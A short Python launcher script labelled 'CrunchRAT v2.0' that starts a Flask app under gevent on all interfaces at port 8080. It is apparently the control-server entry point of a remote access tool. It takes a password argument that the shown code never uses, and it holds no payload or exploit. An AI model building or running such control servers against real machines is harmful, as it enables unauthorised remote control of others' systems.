import argparse
from gevent.wsgi import WSGIServer
from app import app

if __name__ == "__main__":
    # command-line argument parsing
    parser = argparse.ArgumentParser(prog="server.py",
                                     description="CrunchRAT v2.0")

    parser.add_argument("password",
                        action="store",
                        type=str,
                        help="server password")

    args = parser.parse_args()

    # tries to start Flask server on tcp/8080
    try:
        server = WSGIServer(("0.0.0.0", 8080), app)
        server.serve_forever()

    # exception raised starting Flask server
    except Exception as e:
        print("[!] Error: " + str(e))
